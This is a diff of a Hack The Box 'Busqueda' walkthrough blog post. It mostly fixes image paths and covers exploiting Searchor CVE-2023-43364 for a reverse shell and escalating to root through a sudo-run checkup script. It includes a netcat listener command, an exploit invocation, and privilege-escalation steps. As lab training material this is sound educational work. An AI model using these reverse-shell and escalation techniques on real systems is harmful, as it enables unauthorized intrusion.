@@ -8,7 +8,7 @@ tags: [hackthebox,htb,busqueda,red-team,windows,python,privilege-escalation,reve
 author: Will
 ---
 
-![](/assets/img/htb_servmon/busqueda_icon.png)
+![](/assets/img/htb_busqueda/busqueda_icon.png)
 image source: https://labs.hackthebox.com/storage/avatars/a6942ab57b6a79f71240420442027334.png
 
 ## ***Warning: This tutorial is for educational purposes only. Do not try any techniques discussed here on systems you do not own or without explicit permission from the owner.***
@@ -48,7 +48,7 @@ To recap what this command means:
 
 Here is what I got:
 
-![](/assets/img/htb_servmon/Screenshot_From_2024-10-02_22-00-47.png)
+![](/assets/img/htb_busqueda/Screenshot_From_2024-10-02_22-00-47.png)
 
 Three main ports open: port 22 running ssh, port 80 running http with the http-title of searcher.htb. I am going to go for the http site first as this will likely be the easiest to access and exploit. Before we do so, I will need to update the hosts file
 #### etc/hosts
@@ -63,11 +63,13 @@ sudo echo “[INSERT_IP_HERE] searcher.htb” > /etc/hosts
 
 Now if we go to http://searcher.htb, we should see the page come up:
 
-![](/assets/img/htb_servmon/Screenshot_From_2024-10-02_22-10-15.png)
+![](/assets/img/htb_busqueda/Screenshot_From_2024-10-02_22-10-15.png)
 
 on the bottom, we should see "Powered by [Flask](https://flask.palletsprojects.com) and [Searchor 2.4.0](https://github.com/ArjunSharda/Searchor)"
 
 We could look for associated CVEs on either Flask or Searchor. I am going to prioritize searchor as it seems to be a more niche software without as much support as flask.
+
+Searchor seems to be a python search utility (get it? busqueda in spanish means search).
 
 Eventually, we see CVE-2023-43364:
 
@@ -172,24 +174,24 @@ to break down this input:
 **8080**: the port number we are using
 **-s**: local source address, insert your IP that HTB assigned your machine via VPN. You can either find it through the command line with commands like **ifconfig**, **ip address**, or you can just find it in your machine connection:
 
-![](/assets/img/htb_servmon/Screenshot_From_2024-10-28_21-07-48.png)
+![](/assets/img/htb_busqueda/Screenshot_From_2024-10-28_21-07-48.png)
 
 **heads up: you may need root permissions to open up a port, in which case just put a "sudo" at the beginning**
 
 now just run this command and we should be ready to go:
 
 ``` bash
-python3 exploit.py [INSERT_LOCAL_VPN_IP_HERE] 8080 http://10.129.229.26:55555/xfuvxex
+python3 exploit.py [INSERT_LOCAL_VPN_IP_HERE] 8080 [INSERT_TARGET_URL_HERE]
 ```
+looks like we now have revshell as a user named svc:
 
-looks like we now have revshell as a user named puma:
+![](/assets/img/htb_busqueda/Screenshot_From_2024-10-28_21-34-58.png)
 
-![](/assets/img/htb_servmon/Screenshot_From_2024-10-28_21-34-58.png)
 ### Command and Control
 
 it seems as though we already have a normal user, so let's navigate to the home directory and see if we can find anything:
 
-![](/assets/img/htb_servmon/Screenshot_From_2024-09-24_01-20-54.png)
+![](/assets/img/htb_busqueda/Screenshot_From_2024-09-24_01-20-54.png)
 
 we then can see a file named user.txt and that seems to be the user flag!
 
@@ -201,27 +203,27 @@ now let's see if we can get root.
 
 here we can upload linpeas or something of that nature. While that would work, I want to try and get low hanging fruit with a simple "sudo -l"
 
-![](/assets/img/htb_servmon/Screenshot_From_2024-11-05_21-15-11.png)
+![](/assets/img/htb_busqueda/Screenshot_From_2024-11-05_21-15-11.png)
 
 looks like there is a python script that the user can execute as root, but not read or write.
 
-![](/assets/img/htb_servmon/Screenshot_From_2024-11-05_21-26-36.png)
+![](/assets/img/htb_busqueda/Screenshot_From_2024-11-05_21-26-36.png)
 
 executing it, we get a couple options, but I chose to go with the "full-checkup" in order to get a larger picture as to what the script does.
 
 It looks like there is an instance of gitea on the server, I am going to add "gitea.searcher.htb" to the etc/hosts and navigate to the site:
 
-![](/assets/img/htb_servmon/Screenshot_From_2024-11-09_22-29-23.png)
+![](/assets/img/htb_busqueda/Screenshot_From_2024-11-09_22-29-23.png)
 
 going through the site, this mainly looks like a git service that is used to maintain the site.
 
 I also see that the version is Gitea Version: 1.18.0+rc1, let's see if there are any associated CVEs:
 
-![](/assets/img/htb_servmon/Screenshot_From_2024-11-09_22-30-48.png)
+![](/assets/img/htb_busqueda/Screenshot_From_2024-11-09_22-30-48.png)
 
 while there are CVEs associated with Gitea, there aren't any associated with this current version. Looks like we are going to have to get creative:
 
-![](/assets/img/htb_servmon/Screenshot_From_2024-11-09_22-53-02.png)
+![](/assets/img/htb_busqueda/Screenshot_From_2024-11-09_22-53-02.png)
 
 I do notice that full-checkup appears to be a bash file that get executed *with sudo privileges!* by the python script. While we can't edit this file, we could potentially make our own that will give us a reverse shell running as root.
 
@@ -246,11 +248,11 @@ nc -nlvp 8080 -s 10.10.14.186
 
 I did the following steps to create the file:
 
-![](/assets/img/htb_servmon/Screenshot_From_2024-11-10_00-14-11.png)
+![](/assets/img/htb_busqueda/Screenshot_From_2024-11-10_00-14-11.png)
 
 be sure to act quickly though, as the file will be deleted quickly
 
-![](/assets/img/htb_servmon/Screenshot_From_2024-11-10_00-15-14.png)
+![](/assets/img/htb_busqueda/Screenshot_From_2024-11-10_00-15-14.png)
 
 we now have root, navigate to the root directory and grab the flag.
 
